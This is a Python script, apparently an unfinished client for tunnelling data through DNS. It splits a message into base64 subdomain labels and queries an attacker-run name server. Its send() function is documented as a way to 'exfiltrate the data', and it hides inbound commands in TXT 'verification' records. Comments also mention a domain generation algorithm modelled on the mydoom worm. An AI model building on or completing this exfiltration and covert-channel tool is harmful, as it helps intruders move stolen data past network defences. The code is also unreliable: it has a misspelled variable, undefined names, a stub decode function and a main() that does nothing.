#!/usr/bin/env python3

import argparse
import base64
from sys import argv
import time

import dns.resolver
# from dga import mydoom

# <Fucntion of ability>
## - confirm the number of required request packets -> use subdomain by 'mail'
## - specify the time of interval
## - embed the message as subdomain
# <Scenario>
## 1. decide the target hostname
##   > choose dga or specific domain
## 2. confirm the number of required request packets
##   * your auth server calculates the number of it based on the size of message
## 3. request the TXT record -> with www
# <Mapping of subdomain's order for the server>
## - 'mail' : calculate the number of required packets
##   * your auth server embeds the size and the number of packet in TXT RR
## - 'www'  : request the message in TXT RR
# <Definition of veriable>
## - ex) www.google.com
## - domain : 'google.com'
## - subdomain(message) : 'www'
## - message : outbound. from client to server
## - answer  : inbound. from server to client

def control_argment():
    parser = argparse.ArgumentParser(
                    usage='communicate.py hostname[e.g. google.com] [-h] '\
                          '[-m(message] [-i(interval {s}) <e.g. 60>]',\
                    description='Get the value of domain verification')
    parser.add_argument('domain', help='specify the target domain')
    parser.add_argument('-m', '--message', help='define the message as subdomain')
    parser.add_argument('-i', '--interval', help='difine the interval time of \
                        request packet')
    #parser.add_argument('-dga', '--dga', help='use domain genelation algrorithm', \
                        #action='store_true')


    args = parser.parse_args()

    res = {}
    res['domain'] = args.domain
    if args.message:
        res['subdomain'] = args.message
    if args.interval:
        res['interval'] =args.interval 
    #if args.dga:
        # call DGA function
    #    pass
    return res


def parse_message(message:str, length:int=10) ->list:
    """
    1. Encode the message to base64
    2. make the list of the message split by the length
    * if you decode the message, put on '=' in the end after comine the line
    """
    encoded = base64.b64encode(message.encode()).decode().strip('=')
    response = [encoded[i: i+lentgh] for i in range(0, len(encoded), length)]
    return response

def send(message:str, hostname:str):
    """exfiltrate the data using by subdomain"""
    try:
        qname = message + '.' + hostname
        dns.resolver.query(qname, 'A')
    except:
        print("Can't send or no RR")

def query(message:list, hostname:str, interval:int) ->list:
    """query the value in the TXT"""
    payload = message + '.' + hostname
    response = dns.resolver.query(payload, 'TXT')
    verification_line = [str(i).split('=') for i in response[:]\
                        if 'verification' in str(i)]
    return verification_line

def decipher(answer: list) ->str:
    """
    - Gather the TXT query's domain authentication value
    - Extract the value of domain verification
    - Decode the strings when the string is decode by base64
    """

    subdomain = [str(i).split('=')[1] for i in answer]
    subdomain = [i.strip(DOMAIN) for i in answer]
    value = [base64.b64decode(i.decode()) for i in _subdomain]

    pass

def main():
    argment = control_argment()
    print(argment.items())

    # Based on the artment, execute the functions



if __name__ == '__main__':
    main()

